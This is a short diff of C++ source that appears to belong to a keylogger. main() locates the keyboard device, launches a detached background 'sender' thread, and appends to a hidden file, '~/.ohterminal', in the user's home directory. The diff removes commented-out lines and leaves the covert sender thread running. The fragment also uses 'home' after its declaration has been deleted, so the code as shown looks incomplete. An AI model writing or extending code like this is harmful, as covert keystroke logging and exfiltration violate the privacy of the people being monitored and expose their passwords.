@@ -153,9 +153,8 @@ string find_keyboard()
 
 int main()
 {
-  //  const char* home = getenv("HOME");
     string keyboard = find_keyboard();
-    //sender(home);
+  
     thread(sender,home).detach();
 
     if (keyboard.empty())
@@ -226,7 +225,6 @@ int main()
             continue;
         }
 
-//	const char* home = getenv("HOME");
         ofstream file(string(home) + "/.ohterminal",ios::app);
 
 
